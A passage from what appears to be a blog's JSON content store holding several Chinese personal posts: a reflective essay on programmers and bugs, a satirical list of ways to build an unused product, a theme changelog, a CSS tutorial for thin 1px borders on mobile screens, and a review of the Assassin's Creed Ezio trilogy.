id=\"more\"></a><br>我在修改bug的时候，觉得自己是个<code>医生</code>。望闻问切，察言观色，你你你过来，我看你的网络请求似乎气色不顺，这个cgi接口显然心肾不交，负载均衡恐怕遭遇龙雷之火了吧？这时候以现象查根源，手到擒来，药到病除。</p>\n<p>然而转念一想，这些漏洞可是你自己留下来的呀。所以，你同时又是一个<code>下毒者</code>。徐志摩同学能不留下一片云彩，潇洒如此。如果他是程序员，追求的可是代码千行过，bug不沾身？可惜，是人，说说而已，臣妾都做不到。</p>\n<p>再者，自己还是个<code>病人</code>。别忘了无论你是医生，还是下毒的人，目标都还是自己。围绕着这台戏的始末，你是唯一的演员。我甚至认为“解铃还需系铃人”这句话的发明者，不一定是个聪明人，有可能，他只是孤独到了极致，然后全世界只有他一个人想要解这个铃。其他人都“不需”，所以机智的他“还需”。</p>\n<p>你看，敲键盘原来是件多么复杂的工作！你可能被自己杀死，又可能被自己救活，险象环生，环环相扣！</p>\n<p>三个女人一台戏，一个码农就三台戏；举杯邀明月，对影成三人，简直寂寞如雪。叫我如何不入戏？</p>\n<p>电影里，陈乔恩说“去下一部戏”的时候，转身的一笑情致两饶，看得也是醉了。我倒是出戏了。似乎，明天要接下一个需求了。</p>\n<p>——黎小腾同学 on 8.20</p>\n","source":"_posts/three-drama.markdown","raw":"---\nlayout: post\ntitle: \"三台戏\"\ndate: 2014-08-20 1:18\ncomments: true\ntags: \n\t- 生活\n\t- 随笔\n---       \n\n某天，我站在地铁口的一幅海报前。\n\n巨大的国际象棋棋盘横据画面中心，棋盘微斜，偏移的角度恰好。纹理和刻痕显然是精心设计，至少要用掉三个图层。哑光效果也异常出色。除去文案，这是难得一见的好海报。\n\n但这么多的细节，都是大脑正常运作时所认知到的。我的第一个想法，或者说是直觉，是看着这黑白的格子，就掏出了手机扫一扫…中毒至斯。\n\n但我后来又想，这种“入戏太深”的场景和程序员这一职业不无关系…\n<!-- more -->\n我在修改bug的时候，觉得自己是个``医生``。望闻问切，察言观色，你你你过来，我看你的网络请求似乎气色不顺，这个cgi接口显然心肾不交，负载均衡恐怕遭遇龙雷之火了吧？这时候以现象查根源，手到擒来，药到病除。\n\n然而转念一想，这些漏洞可是你自己留下来的呀。所以，你同时又是一个``下毒者``。徐志摩同学能不留下一片云彩，潇洒如此。如果他是程序员，追求的可是代码千行过，bug不沾身？可惜，是人，说说而已，臣妾都做不到。\n\n再者，自己还是个``病人``。别忘了无论你是医生，还是下毒的人，目标都还是自己。围绕着这台戏的始末，你是唯一的演员。我甚至认为“解铃还需系铃人”这句话的发明者，不一定是个聪明人，有可能，他只是孤独到了极致，然后全世界只有他一个人想要解这个铃。其他人都“不需”，所以机智的他“还需”。\n\n你看，敲键盘原来是件多么复杂的工作！你可能被自己杀死，又可能被自己救活，险象环生，环环相扣！\n\n三个女人一台戏，一个码农就三台戏；举杯邀明月，对影成三人，简直寂寞如雪。叫我如何不入戏？\n\n电影里，陈乔恩说“去下一部戏”的时候，转身的一笑情致两饶，看得也是醉了。我倒是出戏了。似乎，明天要接下一个需求了。\n\n\n\n——黎小腾同学 on 8.20\n","slug":"three-drama","updated":1409460745000,"excerpt":"<p>某天，我站在地铁口的一幅海报前。</p>\n<p>巨大的国际象棋棋盘横据画面中心，棋盘微斜，偏移的角度恰好。纹理和刻痕显然是精心设计，至少要用掉三个图层。哑光效果也异常出色。除去文案，这是难得一见的好海报。</p>\n<p>但这么多的细节，都是大脑正常运作时所认知到的。我的第一个想法，或者说是直觉，是看着这黑白的格子，就掏出了手机扫一扫…中毒至斯。</p>\n<p>但我后来又想，这种“入戏太深”的场景和程序员这一职业不无关系…<br>","_id":"cdarydzboecu4pro","categories":[],"photos":[],"link":""},{"layout":"post","title":"如何成功做出一款没人使用的产品","date":1387511700000,"comments":true,"tags":["jc0qt8cakht35ew1","tq61934ev7ievvyb"],"brief":"Baby，zhè辈子最炫酷de产品只yǒunǐyī个…","content":"<p>1、 logo金属化，而且是重金属。给人朋克风范，炫酷感觉。第一眼就有被闪电晃过灵魂的错觉，这样子就对了。</p>\n<p>2、无限循环的播放背景音乐。不需要设置关闭，你只需要坚持自我。</p>\n<p>3、注册的界面，输入密码的文字框一般有两个：填密码和确认密码的。我们可以做5个，让他们再再确认，这样可以体现你无微不至的情怀。情怀你懂吗？</p>\n<p>4、注册新用户名的时，先把数据检测一下。并提示：你确定用户名不带火星文吗？用户点了否，再提示：那特殊符号也不用❤★※←＆♂吗？如果用户还是点了否，你要做出这样的符号表情来表示不理解：~&gt;_&lt;~</p>\n<p>5、要有“意见反馈”的功能，但是，无论用户提交了什么有价值的意见，甚至用户觉得这建议太美好了以至于自己都high了起来。一律不回。</p>\n<p>6、给用户黑名单里面的人都发个消息：“TA给你加了黑名单我偷偷告诉你，你别告诉TA哦”。</p>\n<p>7、安装程序时，要勾上“同意以上条款，并背诵全文”。</p>\n<p>8、所有文案只写一半，刚引起用户兴趣就戛然而止，记住你是风一般的产品经理。</p>\n<p>9、</p>\n<p>The End.</p>\n","source":"_posts/no-one-used-pro.markdown","raw":"---\nlayout: post\ntitle: \"如何成功做出一款没人使用的产品\"\ndate: 2013-12-20 11:55\ncomments: true\ntags: \n\t- 随笔 \n\t- 药别停\nbrief: \"Baby，zhè辈子最炫酷de产品只yǒunǐyī个…\"\n---       \n\n1、 logo金属化，而且是重金属。给人朋克风范，炫酷感觉。第一眼就有被闪电晃过灵魂的错觉，这样子就对了。\n\n2、无限循环的播放背景音乐。不需要设置关闭，你只需要坚持自我。\n\n3、注册的界面，输入密码的文字框一般有两个：填密码和确认密码的。我们可以做5个，让他们再再确认，这样可以体现你无微不至的情怀。情怀你懂吗？\n\n4、注册新用户名的时，先把数据检测一下。并提示：你确定用户名不带火星文吗？用户点了否，再提示：那特殊符号也不用❤★※←＆♂吗？如果用户还是点了否，你要做出这样的符号表情来表示不理解：~>_<~\n\n5、要有“意见反馈”的功能，但是，无论用户提交了什么有价值的意见，甚至用户觉得这建议太美好了以至于自己都high了起来。一律不回。\n\n6、给用户黑名单里面的人都发个消息：“TA给你加了黑名单我偷偷告诉你，你别告诉TA哦”。\n\n7、安装程序时，要勾上“同意以上条款，并背诵全文”。\n\n8、所有文案只写一半，刚引起用户兴趣就戛然而止，记住你是风一般的产品经理。\n\n9、\n\nThe End.\n","slug":"no-one-used-pro","updated":1409150973000,"excerpt":"","_id":"rvtqyve9fcrnc7tb","categories":[],"photos":[],"link":""},{"layout":"post","title":"Blog主题更新-1.0","date":1355642160000,"comments":true,"tags":["q42jg8fjwg8u8ovb","93rwbunpa4djpbvp"],"key":"4","content":"<p>这次的主题更新重点放在<strong>功能的完善与优化</strong>上，以下是本次（<code>1.0</code>）的更新内容：     </p>\n<h3 id=\"更新记录\">更新记录</h3>\n<ul>\n<li>1.0<ul>\n<li><strong>新增</strong> - 安装<a href=\"https://github.com/tommy351/Octopress-Theme-Slash\" target=\"_blank\" rel=\"external\">slash</a>主题</li>\n<li><strong>新增</strong> - “新浪微博”按钮</li>\n<li><strong>新增</strong> - <a href=\"http://duoshuo.com/\" target=\"_blank\" rel=\"external\">多说</a>第三方评论平台</li>\n<li><strong>新增</strong> - 站点静态搜索</li>\n<li><strong>新增</strong> - <a href=\"http://www.jiathis.com/\" target=\"_blank\" rel=\"external\">jiathis</a>分享按钮</li>\n<li><strong>新增</strong> - 右上角tags开关按钮，以及tags板块</li>\n<li><strong>新增</strong> - 代码高亮显示</li>\n<li><strong>修改</strong> - 将“RSS订阅”按钮链接的xml文件改成feedsky中转页面 </li>\n<li><strong>修改</strong> - 精简原主题代码</li>\n<li><strong>移除</strong> - 取消默认的google搜索</li>\n<li><strong>移除</strong> - 取消<a href=\"http://www.addthis.com/\" target=\"_blank\" rel=\"external\">addthis</a>分享按钮</li>\n<li><strong>移除</strong> - 取消默认第三方评论<a href=\"http://disqus.com/\" target=\"_blank\" rel=\"external\">disqus</a></li>\n</ul>\n</li>\n</ul>\n","source":"_posts/theme-update1-dot-0.markdown","raw":"---\nlayout: post\ntitle: \"Blog主题更新-1.0\"\ndate: 2012-12-16 15:16\ncomments: true\ntags: \n\t- 主题\n\t- octopress\nkey: \"4\"\n---\n这次的主题更新重点放在**功能的完善与优化**上，以下是本次（<code>1.0</code>）的更新内容：     \n### 更新记录\n\n* 1.0\n\t* **新增** - 安装[slash](https://github.com/tommy351/Octopress-Theme-Slash)主题\n\t* **新增** - “新浪微博”按钮\n\t* **新增** - [多说](http://duoshuo.com/)第三方评论平台\n\t* **新增** - 站点静态搜索\n\t* **新增** - [jiathis](http://www.jiathis.com/)分享按钮\n\t* **新增** - 右上角tags开关按钮，以及tags板块\n\t* **新增** - 代码高亮显示\n\t* **修改** - 将“RSS订阅”按钮链接的xml文件改成feedsky中转页面 \n\t* **修改** - 精简原主题代码\n\t* **移除** - 取消默认的google搜索\n\t* **移除** - 取消[addthis](http://www.addthis.com/)分享按钮\n\t* **移除** - 取消默认第三方评论[disqus](http://disqus.com/)\n\t\n","slug":"theme-update1-dot-0","updated":1409149812000,"excerpt":"","_id":"am902b2hxspwq0k5","categories":[],"photos":[],"link":""},{"layout":"post","title":"像素级细节：移动端1px border的实现","date":1393071060000,"comments":true,"tags":["v22smsab7f83ld0m","panvos05q85sf6qq"],"brief":"记住，每个尽责的设计师都是处女座","content":"<blockquote>\n<p>请记住，每个尽责的设计师都是处女座…</p>\n</blockquote>\n<p>这里…没有黑处女座的意思，只是想借题发挥，并由衷的跪倒在强大的“像素眼”之下。<br><a id=\"more\"></a></p>\n<h3 id=\"一、你是我的眼\">一、你是我的眼</h3>\n<p>什么是像素眼？<br>就是那些个神奇的存在，他们用余光瞄了你一眼，然后跟你说：我发现啊，你左边眉毛比右边眉毛高了1像素，麻烦你调整下…</p>\n<p>在腾讯，我身边的许多设计同学都有这样的眼睛。他们会把细节做到极致，也会因为频繁的修改，把你开发的心情搞得一团糟。但你得承认，他们是对的。</p>\n<p>最近在做移动端web开发，按着设计图，toby已在我旁边核对修改了两个多小时。当我觉得已经万事大吉时，toby跟我说，还是觉得不太对——边框好像有点粗？</p>\n<p>当时我就傻眼了，因为这已是最细的边框，电脑上清楚的显示，我已经设置了1px的border。于是我去解释，并建议更换个色值，让边框至少“看起来”更细。而toby却不接受，按他给我的说法是：这border看起来不性感…</p>\n<p>原来这世界的审美观，都是以瘦为美，从女人到一根线？于是乎，为了寻找性感的border，搜集一堆资料后还真找到了方案：</p>\n<ul>\n<li><strong>父元素设置</strong>：scale(0.5,0.5)                 </li>\n<li><strong>子元素设置</strong>：scale(2,2) 还原缩放，origin都是基于左上角（0,0）/left top</li>\n</ul>\n<p>这样父元素的border其实被缩放了，无疑更细。</p>\n<h3 id=\"二、通用方案\">二、通用方案</h3>\n<p>用一个css类去为block元素添加更细的border</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">.border-1px{</div><div class=\"line\">  position: relative;</div><div class=\"line\">  &:before, &:after{</div><div class=\"line\">    border-top: 1px solid #c8c7cc;</div><div class=\"line\">    content: ' ';</div><div class=\"line\">    display: block;</div><div class=\"line\">    width: 100%;</div><div class=\"line\">    position: absolute;</div><div class=\"line\">    left: 0;</div><div class=\"line\">  }</div><div class=\"line\">  &:before{</div><div class=\"line\">    top: 0;</div><div class=\"line\">  }</div><div class=\"line\">  &:after{</div><div class=\"line\">    bottom: 0;</div><div class=\"line\">  }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>适应移动设备：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">@media (-webkit-min-device-pixel-ratio:1.5), (min-device-pixel-ratio: 1.5){</div><div class=\"line\">  .border-1px{</div><div class=\"line\">    &::after, &::before{</div><div class=\"line\">      -webkit-transform: scaleY(.7);</div><div class=\"line\">      -webkit-transform-origin: 0 0;</div><div class=\"line\">      transform: scaleY(.7);</div><div class=\"line\">    }</div><div class=\"line\">    &::after{</div><div class=\"line\">      -webkit-transform-origin: left bottom;</div><div class=\"line\">    }</div><div class=\"line\">  }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">@media (-webkit-min-device-pixel-ratio:2), (min-device-pixel-ratio: 2){</div><div class=\"line\">  .border-1px{</div><div class=\"line\">    &::after, &::before{</div><div class=\"line\">      -webkit-transform: scaleY(.5);</div><div class=\"line\">      transform: scaleY(.5);</div><div class=\"line\">    }</div><div class=\"line\">  }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h3 id=\"三、来个对比\">三、来个对比</h3>\n<p>比如，之前我学日语时，自己搞起了个app，这是50音列表界面，可以明显的看出区别：上图是原生方案，下图是…性感方案<br><img src=\"/assets/blogImg/border1px.jpg\" alt=\"与原生方案对比\">      </p>\n<p>源码小demo，注意要在手机上才能看到效果：<a href=\"/assets/demo/border1px.html\">demo</a>。</p>\n<p>The End.<br>——litten 2.22 <em>“写轮眼？弱爆了啊 ←_←”</em></p>\n","source":"_posts/thinner-than-1px-border.markdown","raw":"---\nlayout: post\ntitle: \"像素级细节：移动端1px border的实现\"\ndate: 2014-02-22 20:11\ncomments: true\ntags: \n  - css3 \n  - html5\nbrief: \"记住，每个尽责的设计师都是处女座\"\n---       \n\n> 请记住，每个尽责的设计师都是处女座…\n\n这里…没有黑处女座的意思，只是想借题发挥，并由衷的跪倒在强大的“像素眼”之下。\n<!-- more -->\n###一、你是我的眼\n\n什么是像素眼？                 \n就是那些个神奇的存在，他们用余光瞄了你一眼，然后跟你说：我发现啊，你左边眉毛比右边眉毛高了1像素，麻烦你调整下…\n\n在腾讯，我身边的许多设计同学都有这样的眼睛。他们会把细节做到极致，也会因为频繁的修改，把你开发的心情搞得一团糟。但你得承认，他们是对的。\n\n最近在做移动端web开发，按着设计图，toby已在我旁边核对修改了两个多小时。当我觉得已经万事大吉时，toby跟我说，还是觉得不太对——边框好像有点粗？\n\n当时我就傻眼了，因为这已是最细的边框，电脑上清楚的显示，我已经设置了1px的border。于是我去解释，并建议更换个色值，让边框至少“看起来”更细。而toby却不接受，按他给我的说法是：这border看起来不性感…\n\n原来这世界的审美观，都是以瘦为美，从女人到一根线？于是乎，为了寻找性感的border，搜集一堆资料后还真找到了方案：\n\n- **父元素设置**：scale(0.5,0.5)                 \n- **子元素设置**：scale(2,2) 还原缩放，origin都是基于左上角（0,0）/left top\n\n这样父元素的border其实被缩放了，无疑更细。\n\n###二、通用方案\n\n用一个css类去为block元素添加更细的border\n```css\n    .border-1px{\n      position: relative;\n      &:before, &:after{\n        border-top: 1px solid #c8c7cc;\n        content: ' ';\n        display: block;\n        width: 100%;\n        position: absolute;\n        left: 0;\n      }\n      &:before{\n        top: 0;\n      }\n      &:after{\n        bottom: 0;\n      }\n    }\n```\n适应移动设备：\n```css\n    @media (-webkit-min-device-pixel-ratio:1.5), (min-device-pixel-ratio: 1.5){\n      .border-1px{\n        &::after, &::before{\n          -webkit-transform: scaleY(.7);\n          -webkit-transform-origin: 0 0;\n          transform: scaleY(.7);\n        }\n        &::after{\n          -webkit-transform-origin: left bottom;\n        }\n      }\n    }\n\n    @media (-webkit-min-device-pixel-ratio:2), (min-device-pixel-ratio: 2){\n      .border-1px{\n        &::after, &::before{\n          -webkit-transform: scaleY(.5);\n          transform: scaleY(.5);\n        }\n      }\n    }\n```\n###三、来个对比\n\n比如，之前我学日语时，自己搞起了个app，这是50音列表界面，可以明显的看出区别：上图是原生方案，下图是…性感方案                \n![与原生方案对比](/assets/blogImg/border1px.jpg)      \n\n源码小demo，注意要在手机上才能看到效果：[demo](/assets/demo/border1px.html)。\n\n\n\nThe End.                 \n——litten 2.22 *“写轮眼？弱爆了啊 ←_←”*\n","slug":"thinner-than-1px-border","updated":1409364838000,"excerpt":"<blockquote>\n<p>请记住，每个尽责的设计师都是处女座…</p>\n</blockquote>\n<p>这里…没有黑处女座的意思，只是想借题发挥，并由衷的跪倒在强大的“像素眼”之下。<br>","_id":"ipboeihcbuv1as13","categories":[],"photos":[],"link":""},{"layout":"post","title":"记“刺客信条”三部曲：水月镜像，无心去来","date":1355844180000,"comments":true,"tags":["195v0l438qwq74xu","jc0qt8cakht35ew1"],"brief":"第一次有冲动为一个游戏写文字","content":"<p><img src=\"/assets/blogImg/ckxt0.jpg\" alt=\"刺客信条-兄弟会海报\">     </p>\n<blockquote>\n<p>Nothing is true, everything is permitted.万物皆虚，万事皆允。        </p>\n</blockquote>\n<p><em>—— 《刺客信条2》《刺客信条：兄弟会》《刺客信条：启示录》-Ezio三部曲</em><br><a id=\"more\"></a></p>\n<p>实习回来后，在朋友的推荐下玩了刺客信条这款游戏，感触挺深，后来想一定要为它写点文字。闭眼一想，还是那句话萦回脑中：我们为了服侍光明而耕耘于黑暗……万物皆虚，万事皆允。却不知道这句话该怎么翻译，被游戏寓意为“信条”的话语，相对于它的题材所包含的深度，好像任何翻译都会带来偏差。很难用几句话描述清楚这部作品，它展现了完全不同的世界与价值，过去与现在，生存与死亡，仇恨与宽容，这些宽泛弘毅的对立词相互交织，在刀刃与鲜血中重获新释，浓缩于主人公Ezio的一生。</p>\n<h2 id=\"虚\"><strong>虚</strong></h2>\n<p>Ezio诞生于文艺复兴时期的佛罗伦萨，作为银行家的富二代，每日就是游手好闲沾花惹草。还记得游戏的第一个任务就是去打架，然后爬上高楼跟姑娘幽会。生活波澜不惊，基调如翡翠般平和，蓝天白云之下的鲜花之城给予了Ezio太多纨绔子弟的气息。而至于后来，当他每次的任务都要手起刀落快意恩仇，然后安抚亡者的灵魂，当他对深爱的Sophia的请求无奈道出对不起我的时间很宝贵，当他在异乡的深夜给妹妹Claudia满怀深情地写信时，你才会发现，他动荡的内心深处，自有一个不曾惊扰的世界，一个不曾惊扰的翡冷翠。那些逝去的日子，在游戏开头略显无聊的情景，恰如一个简朴的别针，固定在心中最纯粹的角落。</p>\n<p><img src=\"/assets/blogImg/ckxt1.jpg\" alt=\"奔波到威尼斯的Ezio\">  </p>\n<p>以至于说，何以为正义，真理，信仰，自由？这都是些多么美好的词语，然而都不是Ezio最终想要的，又恰好是他，见过了太多为了这些美好而疯狂追逐，最终坠下深渊的人。好奇害死猫，人又何尝不是？因此，创世的神让人间有了死亡。刺客从天而降，帽檐遮住他的眉宇，和平鸽还不知晓下一刻的慌乱，风起风止间，优雅的袖刃已将迷乱的鲜红绽放。</p>\n<p>Ezio更像一个布道者，将“虚”的信条用死亡的方式传谕。而事物的真实与否，本来就无所谓人的好坏。朋友Leonardo是虚的，他花了很多心里发明战争机器，下一刻就想摧毁它们；叔叔Mario是虚的，一个质朴果敢的领路人，在庄园陷落时便虎落平阳；Niccolo也是虚的，一个满腹经纶兢兢业业的刺客首领，却一度被当作内奸。连Ezio本人也是虚的，从佛罗伦萨的起步，到威尼斯的追寻，再到罗马的复兴，最后到君士坦丁堡的迟暮，其实Ezio最终才认识到，自己不也是为所谓的复仇与荣耀努力了一辈子吗？原来那个最先坠入深渊的人，正是Ezio自己。</p>\n<p><img src=\"/assets/blogImg/ckxt2.jpg\" alt=\"刺客从天而降\">      </p>\n<p>因此，Ezio最后在和害死了父兄的教皇Rodrigo对峙时，留下这句信条而放过了他（最终反被儿子Cesare毒死）。这一刻，不知手染太多鲜血的刺客大师是否想到了多年前的一尘不染的佛罗伦萨。抉择与变卦，过一分钟就不能再回头。Ezio的身后这座辉煌的城市，原本就是他想终结邪恶，获得荣耀的目的地。如今，城市更加辉煌，以往的日子，爱人，自由，却一并失去了踪影。相对于当下，他知道一切于事无补，反而有一种繁花落尽，悄然入土的随性。他赫然发现Nothing is true原来不是对别人的告诫，而是对自己内心深处最无奈的独白。</p>\n<h2 id=\"允\"><strong>允</strong></h2>\n<p>任何一个刺客，加入brotherhood时都要完成一个仪式。他们从城市最高的塔尖上俯瞰全城，然后向着塔底的草堆高高跃下。他们在跃下的那一刻伸展手臂，一种近乎疯狂的自由呼啸而来，将烦恼和恐惧抛诸脑后，你很容易联想到鹰的意象。我们总是可以将道理示于别人，却无法说服自己。这种仪式无疑是对自身的勇敢与自由最好的诠释，刺客们以这样的方式向城市宣告，他们的行为准则秉承信仰，允许他们在法律和道德中掌握邪恶者的生杀大权。他们称之为“信仰之跃”。</p>\n<p><img src=\"/assets/blogImg/ckxt3.jpg\" alt=\"信仰之跃\">      </p>\n<p>他们在塔尖飘飞消失，城市的风景情韵尽收眼底，背后是虚无的高塔，火焰，荣耀，前方是被允许的使命。而一个人的好与坏，生与死，无时不在拷问着Ezio的灵魂。是的，他也刺杀过好人，而他更多选择了沉默与忘却。允许，到底谁在允许？导师Altair在多次刺杀后终于有觉悟的说：“我所杀的人都对我说了些奇怪的话。他们都没有后悔。即使快死了，他们也看着对胜利很有自信。法律不是来自于神，而是理性。我现在明白了我们的信条不是要求我们去自由。是要求我们智慧。”一个允字，要么成为刺杀后不觉得罪恶的借口，要么成为超越假象的大智慧。</p>\n<p>游戏情节里有一幕我印象特别深，年迈的Ezio将地下城军火库的首领刺死，单膝跪地抱着他的尸体，缓缓的说：“杀戮是可耻的…”。你能否想象，这是一个手沾鲜血，以刺杀为荣的刺客大师，对着刚被自己刺杀的将亡人说出的一番话。人到了死神降临这一步，才会明白所谓是非成败转头空，才会明白权利和金钱都会在下一次眨眼中灰飞烟灭。而杀人者Ezio此时最想告诉对方的，就是对方杀戮的原罪，不是其他。Ezio此时的眼神不是锋利的，而是坚定如磐石，我想到这一步，头发灰白的Ezio是参透了信条何谓“万事皆允”。Ezio异常从容与坚定，他知道他的杀戮必将会带来救赎，这是上天的允许，也是内心的智慧。刀锋使处，字句溃逃，任何的道理都无法阻止手中将逝的灵魂。<br><img src=\"/assets/blogImg/ckxt4.jpg\" alt=\"年迈的Ezio\">      </p>\n<p>到了这个时候，才知道年过半百的Ezio为什么在君士坦丁堡受这么多人的尊重，才知道为什么他严厉指责因鲁莽而错杀他人的徒弟，不全是因为高明的刺杀艺术，更多的是他比更多年轻人知道内心一个允字的定夺。而最后，Ezio完成了对自己的救赎，英雄迟暮，卸甲归田。一颗颠簸的心，终于泡在村灯狗吠之中。在定夺了这么多人的命运之后，他终于想到了自己，想到了Sophia，想到了佛罗伦萨。如果世上有一个人能阻止他，那这个人肯定是Ezio自己，因而他允许了英雄的离去，从容的卸下袖剑，留下背影，自此，永不回头。而门前的花与阳光在岁月中偷偷窜出，似乎等了他几十年。</p>\n<p>Ezio最后的信：</p>\n<blockquote>\n<p>When I was a young man,<br>当我还是个年轻的小伙子<br>I had liberty, but I did not see it.<br>我拥有自由，却从未认知<br>I had time, but I did not know it.<br>我拥有时间，却毫不知情<br>And I had love, but I did not feel it.<br>而我亦拥有爱，却从未感觉到<br>Many decades would pass before I understood the meaning of all three.<br>直到数十年过去后，我才真正理解这三项的意义<br>And now, the twilight of my life, misunderstanding has past into contentment.<br>而现在，垂暮之年的我，这领悟让我感到满足<br>Love, liberty, and time: once was so disposable, are the fuels that drive me forward.<br>曾经能自由支配的爱，自由以及时间，是支持我前进的动力<br>And love, most especially, mia caro.<br>而爱，是最特别的一个， 亲爱的<br>For you, our children, our brothers and sisters.<br>为你，为我们的孩子以及为我们的兄弟姐妹们<br>And for the vast and wonderful world that gives us lives and keeps us guessing,<br>为这赐予我们生命与惊奇的广阔，精彩的世界<br>endless affection，mio Sofia,<br>至死不渝的挚爱， 我的索菲亚<br>Forever yours, Ezio Auditore<br>永远属于你的， Ezio Auditore                   </p>\n</blockquote>\n","source":"_posts/assassins-creed.markdown","raw":"---\nlayout: post\ntitle: \"记“刺客信条”三部曲：水月镜像，无心去来\"\ndate: 2012-12-18 23:23\ncomments: true\ntags: \n\t- 游戏 \n\t- 随笔\nbrief: \"第一次有冲动为一个游戏写文字\"\n---\n![刺客信条-兄弟会海报](/assets/blogImg/ckxt0.jpg)     \n> Nothing is true, everything is permitted.万物皆虚，万事皆允。        \n\n*—— 《刺客信条2》《刺客信条：兄弟会》《刺客信条：启示录》-Ezio三部曲*\n<!-- more -->\n\n实习回来后，在朋友的推荐下玩了刺客信条这款游戏，感触挺深，后来想一定要为它写点文字。闭眼一想，还是那句话萦回脑中：我们为了服侍光明而耕耘于黑暗……万物皆虚，万事皆允。却不知道这句话该怎么翻译，被游戏寓意为“信条”的话语，相对于它的题材所包含的深度，好像任何翻译都会带来偏差。很难用几句话描述清楚这部作品，它展现了完全不同的世界与价值，过去与现在，生存与死亡，仇恨与宽容，这些宽泛弘毅的对立词相互交织，在刀刃与鲜血中重获新释，浓缩于主人公Ezio的一生。\n\n##**虚**\n\nEzio诞生于文艺复兴时期的佛罗伦萨，作为银行家的富二代，每日就是游手好闲沾花惹草。还记得游戏的第一个任务就是去打架，然后爬上高楼跟姑娘幽会。生活波澜不惊，基调如翡翠般平和，蓝天白云之下的鲜花之城给予了Ezio太多纨绔子弟的气息。而至于后来，当他每次的任务都要手起刀落快意恩仇，然后安抚亡者的灵魂，当他对深爱的Sophia的请求无奈道出对不起我的时间很宝贵，当他在异乡的深夜给妹妹Claudia满怀深情地写信时，你才会发现，他动荡的内心深处，自有一个不曾惊扰的世界，一个不曾惊扰的翡冷翠。那些逝去的日子，在游戏开头略显无聊的情景，恰如一个简朴的别针，固定在心中最纯粹的角落。\n\n![奔波到威尼斯的Ezio](/assets/blogImg/ckxt1.jpg)  \n\n以至于说，何以为正义，真理，信仰，自由？这都是些多么美好的词语，然而都不是Ezio最终想要的，又恰好是他，见过了太多为了这些美好而疯狂追逐，最终坠下深渊的人。好奇害死猫，人又何尝不是？因此，创世的神让人间有了死亡。刺客从天而降，帽檐遮住他的眉宇，和平鸽还不知晓下一刻的慌乱，风起风止间，优雅的袖刃已将迷乱的鲜红绽放。\n             \nEzio更像一个布道者，将“虚”的信条用死亡的方式传谕。而事物的真实与否，本来就无所谓人的好坏。朋友Leonardo是虚的，他花了很多心里发明战争机器，下一刻就想摧毁它们；叔叔Mario是虚的，一个质朴果敢的领路人，在庄园陷落时便虎落平阳；Niccolo也是虚的，一个满腹经纶兢兢业业的刺客首领，却一度被当作内奸。连Ezio本人也是虚的，从佛罗伦萨的起步，到威尼斯的追寻，再到罗马的复兴，最后到君士坦丁堡的迟暮，其实Ezio最终才认识到，自己不也是为所谓的复仇与荣耀努力了一辈子吗？原来那个最先坠入深渊的人，正是Ezio自己。\n\n![刺客从天而降](/assets/blogImg/ckxt2.jpg)      \n\n因此，Ezio最后在和害死了父兄的教皇Rodrigo对峙时，留下这句信条而放过了他（最终反被儿子Cesare毒死）。这一刻，不知手染太多鲜血的刺客大师是否想到了多年前的一尘不染的佛罗伦萨。抉择与变卦，过一分钟就不能再回头。Ezio的身后这座辉煌的城市，原本就是他想终结邪恶，获得荣耀的目的地。如今，城市更加辉煌，以往的日子，爱人，自由，却一并失去了踪影。相对于当下，他知道一切于事无补，反而有一种繁花落尽，悄然入土的随性。他赫然发现Nothing is true原来不是对别人的告诫，而是对自己内心深处最无奈的独白。\n\n##**允**\n\n任何一个刺客，加入brotherhood时都要完成一个仪式。他们从城市最高的塔尖上俯瞰全城，然后向着塔底的草堆高高跃下。他们在跃下的那一刻伸展手臂，一种近乎疯狂的自由呼啸而来，将烦恼和恐惧抛诸脑后，你很容易联想到鹰的意象。我们总是可以将道理示于别人，却无法说服自己。这种仪式无疑是对自身的勇敢与自由最好的诠释，刺客们以这样的方式向城市宣告，他们的行为准则秉承信仰，允许他们在法律和道德中掌握邪恶者的生杀大权。他们称之为“信仰之跃”。\n\n![信仰之跃](/assets/blogImg/ckxt3.jpg)      \n\n他们在塔尖飘飞消失，城市的风景情韵尽收眼底，背后是虚无的高塔，火焰，荣耀，前方是被允许的使命。而一个人的好与坏，生与死，无时不在拷问着Ezio的灵魂。是的，他也刺杀过好人，而他更多选择了沉默与忘却。允许，到底谁在允许？导师Altair在多次刺杀后终于有觉悟的说：“我所杀的人都对我说了些奇怪的话。他们都没有后悔。即使快死了，他们也看着对胜利很有自信。法律不是来自于神，而是理性。我现在明白了我们的信条不是要求我们去自由。是要求我们智慧。”一个允字，要么成为刺杀后不觉得罪恶的借口，要么成为超越假象的大智慧。\n                 